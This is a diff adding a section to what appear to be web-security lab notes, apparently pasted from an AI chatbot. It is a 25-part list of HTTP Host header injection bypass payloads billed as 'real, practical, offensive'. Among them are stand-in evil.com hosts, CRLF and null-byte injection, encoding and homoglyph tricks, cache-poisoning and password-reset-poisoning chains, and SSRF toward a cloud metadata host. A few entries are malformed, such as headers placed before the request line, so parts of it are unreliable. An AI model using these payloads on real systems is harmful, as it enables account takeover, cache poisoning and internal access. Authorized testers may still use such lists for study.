@@ -642,3 +642,325 @@ username=carlos&csrf=CY6qJXGEMwYMKu0z18mEKfFo2zAoE866
 
 ![img](media/a172822dd6cbf2ad96f8f5b29b6638bc.png)
 
+
+Below is the **complete, expanded, full bypass payload list for HTTP Host Header Injection**, formatted cleanly and consistently with your earlier **“Complete Test Case (with Bypass Cases)”** structure.
+
+This version contains **real, practical, offensive test payloads** used by pentesters and red teamers.
+
+---
+
+# ✅ **HTTP Host Header Injection – Complete Bypass Payload List**
+
+Below are **ONLY the bypass payloads**, categorized and expanded to cover every realistic evasion technique.
+
+---
+
+# **1. Basic Injection Payloads**
+
+```
+Host: attacker.com
+Host: evil.com
+Host: localhost
+Host: 127.0.0.1
+```
+
+---
+
+# **2. Port Manipulation Bypass**
+
+```
+Host: victim.com:80
+Host: victim.com:443
+Host: evil.com:443
+Host: localhost:8080
+Host: 127.0.0.1:22
+```
+
+---
+
+# **3. URL Injection Bypass**
+
+```
+Host: evil.com/
+Host: evil.com/test
+Host: evil.com/anything?x=1
+```
+
+---
+
+# **4. Subdomain Spoofing Bypass**
+
+```
+Host: victim.com.evil.com
+Host: evil.com.victim.com
+Host: admin.victim.com.evil.com
+```
+
+---
+
+# **5. Trailing Dot Bypass**
+
+```
+Host: victim.com.
+Host: evil.com.
+```
+
+---
+
+# **6. Trailing Space / Tab Bypass**
+
+Spaces:
+
+```
+Host: victim.com␣
+Host: evil.com␣
+```
+
+Tabs:
+
+```
+Host: victim.com\t
+Host: evil.com\t
+```
+
+---
+
+# **7. Multiple Host Headers (Parser Confusion)**
+
+Often the **last** one overrides, sometimes the **first**.
+
+```
+Host: victim.com
+Host: evil.com
+```
+
+```
+Host: evil.com
+Host: victim.com
+```
+
+```
+Host: victim.com
+X-Forwarded-Host: evil.com
+```
+
+---
+
+# **8. CRLF Injection Inside Host Header**
+
+```
+Host: victim.com%0d%0aX-Forwarded-Host: evil.com
+Host: victim.com%0d%0aX-Host: evil.com
+Host: victim.com%0d%0aX-Original-URL: /admin
+```
+
+---
+
+# **9. Encoded Host Header Bypass**
+
+**URL Encoded:**
+
+```
+Host: %76%69%63%74%69%6d.com
+Host: evil%2ecom
+```
+
+**Double-encoded:**
+
+```
+Host: %2565%2576%2569%256c.com
+```
+
+---
+
+# **10. IPv4 / IPv6 Literal Bypass**
+
+**IPv4:**
+
+```
+Host: 127.0.0.1
+Host: 2130706433  (integer form of 127.0.0.1)
+Host: 0177.0.0.1  (octal)
+```
+
+**IPv6:**
+
+```
+Host: [::1]
+Host: [0:0:0:0:0:ffff:127.0.0.1]
+```
+
+---
+
+# **11. Exploiting Trusted Header Rewrite Chains**
+
+```
+X-Forwarded-Host: evil.com
+X-Forwarded-Server: evil.com
+X-HTTP-Host-Override: evil.com
+X-Host: evil.com
+```
+
+---
+
+# **12. Adding Extra Dots to Break Filters**
+
+```
+Host: .evil.com
+Host: ..evil.com
+Host: victim.com..evil.com
+```
+
+---
+
+# **13. Mixed-Case Bypass**
+
+```
+HOST: evil.com
+HoSt: evil.com
+hOsT: evil.com
+```
+
+---
+
+# **14. Using Unicode Homoglyphs**
+
+Bypasses naive domain validation.
+
+```
+Host: vіctim.com     (i replaced with Cyrillic)
+Host: víctim.com     (accented i)
+Host: victіm.com     (mixed homoglyph)
+```
+
+---
+
+# **15. Exploit Host Splitting**
+
+```
+Host: evil.com@victim.com
+Host: victim.com@evil.com
+```
+
+Some parsers treat the part after `@` as the host.
+
+---
+
+# **16. Injection into Absolute URLs**
+
+```
+GET http://evil.com/ HTTP/1.1
+Host: victim.com
+```
+
+Many servers trust the URL host over the Host header.
+
+---
+
+# **17. Using Commas (Proxy Confusion)**
+
+```
+Host: victim.com,evil.com
+Host: evil.com,victim.com
+```
+
+---
+
+# **18. HTTP/2 Host Header Bypass**
+
+HTTP/2 uses `:authority` pseudo-header.
+
+```
+:authority: evil.com
+```
+
+Or injecting mismatched headers:
+
+```
+:authority: victim.com
+Host: evil.com
+```
+
+---
+
+# **19. Invalid but Parser-Acceptable Characters**
+
+```
+Host: evil.com#
+Host: evil.com?
+Host: evil.com!
+Host: evil.com,
+```
+
+---
+
+# **20. Null-Byte Injection**
+
+```
+Host: evil.com%00victim.com
+Host: victim.com%00.evil.com
+```
+
+---
+
+# **21. Add/Delete Slash Tricks**
+
+```
+Host: //evil.com
+Host: /evil.com/
+Host: \evil.com
+```
+
+---
+
+# **22. Open Redirect + Host Injection Combined**
+
+```
+Host: evil.com
+GET /redirect?url=http://victim.com
+```
+
+---
+
+# **23. Exploit Misconfigured CDNs / Reverse Proxies**
+
+```
+True-Client-IP: 127.0.0.1
+X-Proxy-Host: evil.com
+```
+
+---
+
+# **24. Absolute URL Injection (Cache Poisoning)**
+
+```
+Host: victim.com
+GET https://evil.com/ HTTP/1.1
+```
+
+---
+
+# **25. Combined Payloads (Real Attack Chains)**
+
+### **25.1 Cache Poisoning Payload**
+
+```
+Host: evil.com
+X-Forwarded-Host: evil.com
+```
+
+### **25.2 Password Reset Poisoning**
+
+```
+Host: evil.com
+Connection: keep-alive
+```
+
+### **25.3 SSRF-style Host Injection**
+
+```
+Host: 127.0.0.1
+Host: metadata.google.internal
+```
+
+---
